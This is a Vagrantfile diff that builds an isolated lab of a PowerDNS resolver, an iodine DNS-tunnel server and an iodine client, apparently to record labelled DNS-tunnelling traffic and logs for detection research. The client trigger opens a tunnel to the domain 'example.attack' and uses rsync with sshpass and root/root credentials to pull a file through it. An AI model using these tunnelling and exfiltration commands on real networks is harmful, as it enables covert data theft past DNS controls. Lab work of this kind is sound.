@@ -1,0 +1,168 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+
+
+
+config.vm.define "powerdns" do |powerdns|
+
+    # Set the box-type and version (default is latest)
+    powerdns.vm.box = "ubuntu/focal64"
+    powerdns.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    powerdns.vm.hostname = "powerdns"
+
+    # Setup networking
+    powerdns.vm.network "private_network", ip: "192.168.0.10", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    powerdns.vm.provision "ansible_local" do |a|
+        a.install = true,
+        a.install_mode = "default",
+        a.playbook = 'powerdns_playbook',
+        a.become_user = "root",
+        a.become = true
+    end
+    
+    powerdns.vm.provision "ansible_local" do |a|
+        a.install = true,
+        a.install_mode = "default",
+        a.playbook = "filebeat_playbook_powerdns",
+        a.become_user = "root",
+        a.become = true
+    end
+    # Runtime triggers
+    powerdns.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Begin TCPDUMP capture."
+        trigger.run_remote = { inline: 'rm -f nohup.out; nohup tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53 & sleep 1; echo $! > /var/run/tcpdump.pid', privileged: true }
+    end
+    powerdns.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'sudo systemctl restart pdns-recursor;', privileged: true }
+    end
+
+    # Data collection
+    
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Stopping TCPDUMP"
+        trigger.run_remote = { inline: 'if [ -f /var/run/tcpdump.pid ]; then kill $(cat /var/run/tcpdump.pid); rm -f /var/run/tcpdump.pid; fi', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /var/log/pdns.log"
+        trigger.run_remote = { inline: 'chmod o+r /var/log/pdns.log', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /var/log/pdns.log"
+        trigger.run = { inline: 'vagrant scp powerdns:/var/log/pdns.log powerdns/' }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /var/log/pdns.log"
+        trigger.run_remote = { inline: 'rm -rf /var/log/pdns.log', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/dns.pcap', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run = { inline: 'vagrant scp powerdns:/tmp/dns.pcap powerdns/' }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'rm -rf /tmp/dns.pcap', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/filebeat.json*', privileged: true }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run = { inline: 'vagrant scp powerdns:/tmp/filebeat.json* powerdns/' }
+    end
+    powerdns.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'rm -rf /tmp/filebeat.json*', privileged: true }
+    end
+    end
+config.vm.define "iodineserver" do |iodineserver|
+
+    # Set the box-type and version (default is latest)
+    iodineserver.vm.box = "ubuntu/focal64"
+    iodineserver.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    iodineserver.vm.hostname = "iodineserver"
+
+    # Setup networking
+    iodineserver.vm.network "private_network", ip: "192.168.0.20", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    iodineserver.vm.provision "ansible_local" do |a|
+        a.install = true,
+        a.install_mode = "default",
+        a.playbook = 'iodine_server_setup',
+        a.become_user = "root",
+        a.become = true
+    end
+    
+    # Runtime triggers
+    iodineserver.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'nohup asciinema rec /tmp/iodine_server_txt_raw_0xDEADBEEF.cast -c \'set -x; iodined -4 -c -f 10.0.0.1 example.attack -P 0xDEADBEEF & sleep 1\'', privileged: true }
+    end
+
+    # Data collection
+    iodineserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    iodineserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp iodineserver:/tmp/*.cast iodineserver/' }
+    end
+    iodineserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+config.vm.define "iodineclient" do |iodineclient|
+
+    # Set the box-type and version (default is latest)
+    iodineclient.vm.box = "ubuntu/focal64"
+    iodineclient.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    iodineclient.vm.hostname = "iodineclient"
+
+    # Setup networking
+    iodineclient.vm.network "private_network", ip: "192.168.0.30", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    iodineclient.vm.provision "shell", path: 'iodine_client_setup.bash', privileged: true
+    
+    # Runtime triggers
+    iodineclient.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'asciinema rec /tmp/iodine_client_txt_raw_0xDEADBEEF.cast -c \'set -x; (iodine -4 -f -P 0xDEADBEEF -Ttxt -Oraw -r 192.168.0.10 example.attack) & sleep 20; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no" 10.0.0.1:/root/test-file /tmp/\'', privileged: true }
+    end
+
+    # Data collection
+    iodineclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    iodineclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp iodineclient:/tmp/*.cast iodineclient/' }
+    end
+    iodineclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+end
